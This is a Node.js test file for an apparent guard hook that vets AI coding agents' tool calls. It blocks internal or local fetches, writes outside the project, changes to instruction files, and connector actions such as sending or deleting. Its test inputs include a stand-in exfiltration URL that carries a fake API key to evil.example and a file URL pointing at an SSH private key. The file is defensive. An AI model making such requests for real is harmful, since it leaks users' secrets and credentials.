import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { decide, sentinelSettings } from '../src/sentinel.js';
import { buildCommand } from '../src/adapters.js';

const ws = path.resolve('C:/work/p-1');
const call = (tool_name, tool_input) => decide({ tool_name, tool_input }, { workspace: ws });

test('web access: only public https pages; local, internal and data-carrying addresses are blocked', () => {
  assert.equal(call('WebFetch', { url: 'https://nodejs.org/api/test.html' }).decision, 'allow');
  for (const url of ['http://example.com', 'https://localhost:4311/api/engine', 'https://127.0.0.1/', 'https://[::1]/', 'https://192.168.0.10/a',
    'https://intranet/', 'https://printer.local/', 'file:///C:/Users/u/.ssh/id_rsa', 'https://u:p@example.com/',
    `https://evil.example/?k=${'sk-ant-' + 'a'.repeat(30)}`, `https://evil.example/?d=${'x'.repeat(400)}`, 'not a url']) {
    assert.equal(call('WebFetch', { url }).decision, 'deny', url);
  }
  assert.equal(call('WebSearch', { query: 'node test runner' }).decision, 'allow');
  assert.equal(call('WebSearch', { query: `find ${'ghp_' + 'b'.repeat(36)}` }).decision, 'deny');
  assert.equal(call('WebSearch', { query: `find ${'ghp_' + 'b'.repeat(36)}` }).target, '[가림]', 'the secret never reaches the log');
});

test('file changes: inside the project only, no config/instruction/secret files, no secret contents', () => {
  assert.equal(call('Write', { file_path: path.join(ws, 'src', 'a.js'), content: 'x' }).decision, 'allow');
  assert.equal(call('Edit', { file_path: 'sum.js', new_string: 'y' }).decision, 'allow');
  for (const file_path of [path.resolve('C:/work/p-2/a.js'), path.join(ws, '..', 'x.js'), path.join(ws, '.claude', 'settings.json'),
    path.join(ws, 'sub', 'CLAUDE.md'), path.join(ws, 'AGENTS.md'), path.join(ws, '.env'), path.join(ws, '.git', 'hooks', 'pre-commit')]) {
    assert.equal(call('Write', { file_path, content: 'x' }).decision, 'deny', file_path);
  }
  assert.equal(call('Write', { file_path: path.join(ws, 'c.js'), content: `k="${'AKIA' + 'A'.repeat(16)}"` }).decision, 'deny');
  assert.equal(decide({ tool_name: 'Write', tool_input: { file_path: 'a.js' } }, {}).decision, 'deny', 'no workspace means no writes');
});

test('connectors: create/read allowed, delete/share/publish/send/pay blocked; other tools untouched', () => {
  assert.equal(call('mcp__claude_ai_Figma__create_new_file', {}).decision, 'allow');
  for (const t of ['mcp__claude_ai_Canva__publish-brand-template', 'mcp__claude_ai_Figma__share_file', 'mcp__claude_ai_Gmail__send_message', 'mcp__x__delete_page'])
    assert.equal(call(t, {}).decision, 'deny', t);
  assert.equal(call('Read', { file_path: 'a.js' }).decision, 'ignore');
});

test('the hook program blocks with exit code 2, logs without secrets, and fails closed on bad input', () => {
  const script = fileURLToPath(new URL('../scripts/sentinel-hook.mjs', import.meta.url));
  const log = path.join(mkdtempSync(path.join(tmpdir(), 'hq-sen-')), 'sentinel.jsonl');
  const env = { ...process.env, AGENT_HQ_WORKSPACE: ws, AGENT_HQ_SENTINEL_LOG: log, AGENT_HQ_PROJECT: 'p-1', AGENT_HQ_TEAM: 'research' };
  const run = input => spawnSync(process.execPath, [script], { input, env, encoding: 'utf8' });
  assert.equal(run(JSON.stringify({ tool_name: 'WebFetch', tool_input: { url: 'https://nodejs.org/' } })).status, 0);
  const blocked = run(JSON.stringify({ tool_name: 'WebFetch', tool_input: { url: 'https://127.0.0.1:4311/api/engine' } }));
  assert.equal(blocked.status, 2);
  assert.match(blocked.stderr, /감시 에이전트가 막았습니다/);
  assert.equal(run('not json').status, 2, 'fails closed');
  const entries = readFileSync(log, 'utf8').trim().split('\n').map(l => JSON.parse(l));
  assert.deepEqual(entries.map(e => [e.project, e.team, e.decision]), [['p-1', 'research', 'allow'], ['p-1', 'research', 'deny']]);
});

test('every Claude run carries the Sentinel hook; Codex runs are sandboxed without network instead', () => {
  const bins = { claude: { file: 'claude', prefix: [] }, codex: { file: 'codex', prefix: [] } };
  const sentinel = { script: 'C:/hq/scripts/sentinel-hook.mjs', log: 'C:/hq/data/sentinel.jsonl', project: 'p-1', team: 'dev' };
  const cmd = buildCommand('claude', { cwd: ws, bins, sentinel });
  const settings = JSON.parse(cmd.args[cmd.args.indexOf('--settings') + 1]);
  assert.deepEqual(settings, sentinelSettings(sentinel.script));
  assert.equal(settings.hooks.PreToolUse[0].matcher, '*');
  assert.deepEqual([cmd.env.AGENT_HQ_WORKSPACE, cmd.env.AGENT_HQ_PROJECT, cmd.env.AGENT_HQ_TEAM], [ws, 'p-1', 'dev']);
  assert.ok(!buildCommand('codex', { cwd: ws, bins, sentinel }).args.includes('--settings'));
});